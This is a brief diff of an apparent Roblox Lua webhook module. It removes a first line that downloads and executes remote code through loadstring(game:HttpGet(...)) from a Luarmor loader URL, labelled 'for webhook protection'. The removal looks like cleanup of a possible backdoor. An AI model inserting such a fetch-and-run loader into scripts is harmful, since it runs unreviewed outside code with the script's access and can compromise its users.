@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/0c2c98fcbf178f8eb9b8e9bc8486da7d.lua"))() -- for webhook protection
 local HttpService = game:GetService("HttpService")
 
 local WebhookModule = {}
